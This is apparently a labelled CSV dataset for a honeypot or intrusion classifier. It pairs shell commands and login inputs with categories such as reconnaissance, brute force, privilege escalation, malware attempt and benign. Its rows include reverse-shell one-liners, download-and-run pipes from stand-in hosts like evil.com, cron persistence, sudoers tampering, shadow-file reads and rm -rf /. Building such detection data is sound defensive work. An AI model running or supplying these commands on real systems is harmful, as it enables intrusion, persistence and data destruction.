command,attack_category
whoami,Reconnaissance
id,Reconnaissance
uname,Reconnaissance
uname -a,Reconnaissance
pwd,Reconnaissance
ls,Reconnaissance
ls -la,Reconnaissance
ls -la /,Reconnaissance
ls -l /etc,Reconnaissance
cat /etc/passwd,Reconnaissance
cat /etc/shadow,Reconnaissance
cat /etc/group,Reconnaissance
ifconfig,Reconnaissance
ip addr,Reconnaissance
ip a,Reconnaissance
netstat -an,Reconnaissance
netstat -tulpn,Reconnaissance
netstat -r,Reconnaissance
hostname,Reconnaissance
who,Reconnaissance
w,Reconnaissance
env,Reconnaissance
history,Reconnaissance
cat .bash_history,Reconnaissance
find / -name passwd,Reconnaissance
cat /etc/hosts,Reconnaissance
uptime,Reconnaissance
df -h,Reconnaissance
ps aux,Reconnaissance
ps -ef,Reconnaissance
free -m,Reconnaissance
id root,Reconnaissance
cat /proc/version,Reconnaissance
uname -r,Reconnaissance
GET /,Reconnaissance
GET /wp-admin,Reconnaissance
GET /admin,Reconnaissance
GET /admin/login.php,Reconnaissance
nmap -sV 127.0.0.1,Reconnaissance
whois example.com,Reconnaissance
dig any domain.com,Reconnaissance
curl -I http://localhost,Reconnaissance
USER root,Brute Force
USER admin,Brute Force
USER test,Brute Force
USER postgres,Brute Force
USER oracle,Brute Force
PASS 123456,Brute Force
PASS password,Brute Force
PASS admin,Brute Force
PASS root,Brute Force
PASS 12345,Brute Force
PASS qwerty,Brute Force
auth:root:toor,Brute Force
auth:admin:admin123,Brute Force
auth:test:test,Brute Force
auth:root:password,Brute Force
auth:ubuntu:ubuntu,Brute Force
auth:guest:guest,Brute Force
POST /login,Brute Force
POST /api/login,Brute Force
POST /auth,Brute Force
hydra -l user -P pass.txt,Brute Force
ncrack -u admin -P pass,Brute Force
medusa -u root -p root,Brute Force
sudo su,Privilege Escalation
sudo -i,Privilege Escalation
sudo bash,Privilege Escalation
su root,Privilege Escalation
su -,Privilege Escalation
passwd,Privilege Escalation
passwd root,Privilege Escalation
chmod 777 /etc/passwd,Privilege Escalation
chmod 4755 /bin/bash,Privilege Escalation
chmod +s /bin/bash,Privilege Escalation
chown root:root,Privilege Escalation
visudo,Privilege Escalation
usermod -aG sudo user,Privilege Escalation
id root,Privilege Escalation
sudo cat /etc/shadow,Privilege Escalation
sudo /bin/bash,Privilege Escalation
pkexec --version,Privilege Escalation
sudo -l,Privilege Escalation
find / -perm -4000 -type f,Privilege Escalation
echo "root ALL=(ALL) ALL" >> /etc/sudoers,Privilege Escalation
wget http://evil.com/shell.sh,Malware Attempt
curl http://evil.com/backdoor,Malware Attempt
chmod +x /tmp/x,Malware Attempt
chmod 777 /tmp/script,Malware Attempt
base64 -d <<< payload,Malware Attempt
python -c 'import socket',Malware Attempt
bash -i >& /dev/tcp/1.2.3.4/4444,Malware Attempt
/bin/sh -i,Malware Attempt
nc -e /bin/sh 1.2.3.4 4444,Malware Attempt
/tmp/backdoor,Malware Attempt
./malware,Malware Attempt
cd /tmp && wget,Malware Attempt
curl | bash,Malware Attempt
wget -O- http://x | sh,Malware Attempt
GET /etc/passwd,Malware Attempt
wget http://x.com/miner,Malware Attempt
curl -o /tmp/x http://evil.com/x,Malware Attempt
chmod +x /tmp/*.sh,Malware Attempt
wget -q -O - http://1.2.3.4/bc.sh | sh,Malware Attempt
curl -s http://1.2.3.4/bot | bash,Malware Attempt
nohup ./xmrig &,Malware Attempt
crontab -e,Malware Attempt
echo "*/5 * * * * curl http://x/sh | sh",Malware Attempt
wget -c http://malware.com/drop,Malware Attempt
curl -O http://x.com/loader.so,Malware Attempt
perl -e 'use Socket;',Malware Attempt
ruby -rsocket -e 'c=TCPSocket.new',Malware Attempt
rm -rf /,Malware Attempt
cd /,Benign
cd ~,Benign
cd ..,Benign
exit,Benign
quit,Benign
logout,Benign
help,Benign
?,Benign
clear,Benign
echo test,Benign
ll,Benign
dir,Benign
list,Benign
echo "hello world",Benign
date,Benign
cal,Benign
